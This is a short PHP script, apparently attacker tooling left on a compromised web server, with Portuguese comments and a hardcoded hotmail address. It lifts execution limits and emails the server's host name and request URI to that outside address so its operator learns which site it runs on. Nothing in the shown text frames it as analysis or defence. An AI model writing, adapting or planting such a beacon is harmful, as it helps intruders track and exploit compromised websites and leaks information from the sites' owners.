<?php
//=================================
//
//     v1.0
//
//  testando and LOST
//      nao rippem fdps :]
//
//
//      
//=================================
//
 ini_set("max_execution_time",-1);
 set_time_limit(0);
 $user = @get_current_user();
 $email = "$user";
 $assunto = "Vull.";
 $email1 = "zampa203040@hotmail.com";
 $headers  = "From: <$email>\r\n";


 if(mail($email1, $assunto, $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'], $headers)){
 echo "Opa, enviado!";
 exit();
}
 else{
 echo "Nao enviei..";
 exit();
 }
?>
